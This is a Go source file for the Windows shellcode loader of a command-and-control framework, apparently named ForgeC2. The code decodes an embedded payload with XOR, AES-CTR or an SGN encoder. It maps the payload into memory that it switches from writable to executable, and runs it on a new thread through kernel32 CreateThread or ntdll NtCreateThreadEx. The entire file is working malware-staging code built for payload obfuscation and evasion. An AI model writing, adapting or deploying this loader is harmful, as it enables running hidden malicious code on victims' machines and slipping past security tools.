//go:build windows

// Package main implements the ForgeC2 shellcode loader executable. It is a
// standalone, stdlib-only module: the loader source lives here (embedded into
// the server binary) and is copied into a throwaway build directory together
// with a generated payload_gen.go carrying the per-build blob, key, decode
// method and entry technique. The loader decodes the embedded shellcode and
// executes it via a freshly allocated executable memory region.
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"syscall"
	"unsafe"
)

// payloadBlob, payloadKey, payloadMethod and payloadEntry are injected by the
// code-generated payload_gen.go at build time (package-level declarations; a
// build without the generated file fails to compile rather than shipping a
// payload-less binary).

var (
	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc   = kernel32.NewProc("VirtualAlloc")
	procRtlMoveMemory  = kernel32.NewProc("RtlMoveMemory")
	procVirtualProtect = kernel32.NewProc("VirtualProtect")
	procCreateThread   = kernel32.NewProc("CreateThread")
	procWaitForSingle  = kernel32.NewProc("WaitForSingleObject")
	ntdll              = syscall.NewLazyDLL("ntdll.dll")
	procNtCreateThread = ntdll.NewProc("NtCreateThreadEx")
)

const (
	memCommit  = 0x1000
	memReserve = 0x2000
	pageRW     = 0x04
	pageRX     = 0x20
	infinite   = 0xFFFFFFFF
)

func main() {
	if len(payloadBlob) == 0 {
		return
	}
	var data []byte
	switch payloadMethod {
	case "", "none", "sgn":
		// Plain shellcode, or an SGN blob which carries its own decoding
		// stub (position-independent code that decodes itself in place).
		data = payloadBlob
	case "xor":
		data = xorDecode(payloadBlob, payloadKey)
	case "aes":
		data = aesDecode(payloadBlob, payloadKey)
	default:
		return
	}
	if len(data) == 0 {
		return
	}
	switch payloadEntry {
	case "direct":
		runSynchronous(data)
	case "thread":
		if startThread(data) != 0 {
			blockForever()
		}
	case "callback":
		if startThreadNtdll(data) != 0 {
			blockForever()
		}
	}
}

// xorDecode mirrors XOREncoder.Encode: key repeated cyclically, default 0x41
// for an empty key (identical to the encoder-side default).
func xorDecode(data, key []byte) []byte {
	if len(key) == 0 {
		key = []byte{0x41}
	}
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

// aesDecode mirrors AESEncoder.Decode: AES-CTR with the key zero-padded or
// truncated to 16 bytes and an IV derived from the key (SHA-256 prefix), so
// no IV needs to travel in the blob.
func aesDecode(data, key []byte) []byte {
	k := make([]byte, 16)
	copy(k, key)
	block, err := aes.NewCipher(k)
	if err != nil {
		return nil
	}
	sum := sha256.Sum256(key)
	out := make([]byte, len(data))
	cipher.NewCTR(block, sum[:aes.BlockSize]).XORKeyStream(out, data)
	return out
}

// mapMemory allocates a private RW region, copies the shellcode into it and
// flips the page protection to RX. Returns the base address, or 0 on failure.
func mapMemory(data []byte) uintptr {
	addr, _, _ := syscall.Syscall6(
		procVirtualAlloc.Addr(), 4,
		0, uintptr(len(data)), memReserve|memCommit, pageRW, 0, 0,
	)
	if addr == 0 {
		return 0
	}
	syscall.Syscall(
		procRtlMoveMemory.Addr(), 3,
		addr, uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)),
	)
	var old uint32
	ok, _, _ := syscall.Syscall6(
		procVirtualProtect.Addr(), 4,
		addr, uintptr(len(data)), pageRX, uintptr(unsafe.Pointer(&old)), 0, 0,
	)
	if ok == 0 {
		return 0
	}
	return addr
}

// runSynchronous allocates, executes the payload on a thread and waits for it
// to finish before the process exits.
func runSynchronous(data []byte) {
	start := mapMemory(data)
	if start == 0 {
		return
	}
	var threadID uint32
	thread, _, _ := syscall.Syscall6(
		procCreateThread.Addr(), 6,
		0, 0, start, 0, 0, uintptr(unsafe.Pointer(&threadID)),
	)
	if thread == 0 {
		return
	}
	syscall.Syscall(procWaitForSingle.Addr(), 2, thread, infinite, 0)
}

// startThread allocates and spawns the payload on a detached kernel32
// CreateThread. The caller keeps the process alive so the thread survives.
func startThread(data []byte) uintptr {
	start := mapMemory(data)
	if start == 0 {
		return 0
	}
	var threadID uint32
	thread, _, _ := syscall.Syscall6(
		procCreateThread.Addr(), 6,
		0, 0, start, 0, 0, uintptr(unsafe.Pointer(&threadID)),
	)
	return thread
}

// startThreadNtdll spawns the payload via ntdll NtCreateThreadEx (the
// "callback" technique: thread creation without kernel32's CreateThread).
func startThreadNtdll(data []byte) uintptr {
	start := mapMemory(data)
	if start == 0 {
		return 0
	}
	var handle uintptr
	status, _, _ := syscall.SyscallN(
		procNtCreateThread.Addr(),
		uintptr(unsafe.Pointer(&handle)), // thread handle out
		0x1FFFFF,                         // THREAD_ALL_ACCESS
		0,                                // object attributes
		^uintptr(0),                      // current process handle (all ones)
		start,                            // start routine
		0,                                // argument
		0,                                // create flags
		0, 0, 0,                          // stack sizes
	)
	if status != 0 {
		return 0
	}
	return handle
}

func blockForever() {
	select {}
}
